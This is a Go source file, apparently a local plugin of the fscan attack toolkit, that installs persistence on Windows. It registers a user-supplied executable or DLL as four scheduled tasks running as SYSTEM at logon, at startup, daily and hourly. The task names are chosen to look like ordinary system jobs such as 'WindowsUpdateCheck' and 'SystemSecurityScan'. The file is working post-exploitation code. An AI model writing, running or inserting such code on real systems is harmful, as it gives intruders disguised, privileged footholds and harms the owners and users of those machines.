//go:build (plugin_winschtask || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

type WinSchTaskPlugin struct {
	plugins.BasePlugin
}

func NewWinSchTaskPlugin() *WinSchTaskPlugin {
	return &WinSchTaskPlugin{
		BasePlugin: plugins.NewBasePlugin("winschtask"),
	}
}

func (p *WinSchTaskPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	pePath := session.Config.WinPEFile
	if pePath == "" {
		return &plugins.Result{Success: false, Error: fmt.Errorf("%s", i18n.GetText("local_pe_not_specified"))}
	}
	if _, err := os.Stat(pePath); err != nil {
		return &plugins.Result{Success: false, Error: fmt.Errorf("%s", i18n.Tr("local_pe_not_found", pePath))}
	}
	ext := strings.ToLower(filepath.Ext(pePath))
	if ext != ".exe" && ext != ".dll" {
		return &plugins.Result{Success: false, Error: fmt.Errorf("%s", i18n.Tr("local_invalid_pe", pePath))}
	}

	absPath, _ := filepath.Abs(pePath)
	baseName := strings.TrimSuffix(filepath.Base(absPath), filepath.Ext(absPath))

	tasks := []struct {
		name     string
		schedule string
		modifier string
	}{
		{fmt.Sprintf("WindowsUpdateCheck_%s", baseName), "DAILY", "1"},
		{fmt.Sprintf("SystemSecurityScan_%s", baseName), "ONLOGON", ""},
		{fmt.Sprintf("MaintenanceTask_%s", baseName), "ONSTART", ""},
		{fmt.Sprintf("BackgroundService_%s", baseName), "HOURLY", "2"},
	}

	var output strings.Builder
	var successCount int

	for _, task := range tasks {
		args := []string{"/create", "/tn", task.name, "/tr", absPath, "/sc", task.schedule}
		if task.modifier != "" {
			args = append(args, "/mo", task.modifier)
		}
		args = append(args, "/ru", "SYSTEM", "/f")

		cmd := exec.Command("schtasks", args...)
		out, err := cmd.CombinedOutput()
		result := strings.TrimSpace(string(out))
		if err != nil {
			output.WriteString(i18n.Tr("local_step_failed", task.name, result) + "\n")
			continue
		}
		output.WriteString(i18n.Tr("local_step_success_detail", task.name, task.schedule) + "\n")
		successCount++
	}

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("winschtask_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func init() {
	RegisterLocalPlugin("winschtask", func() Plugin {
		return NewWinSchTaskPlugin()
	})
}
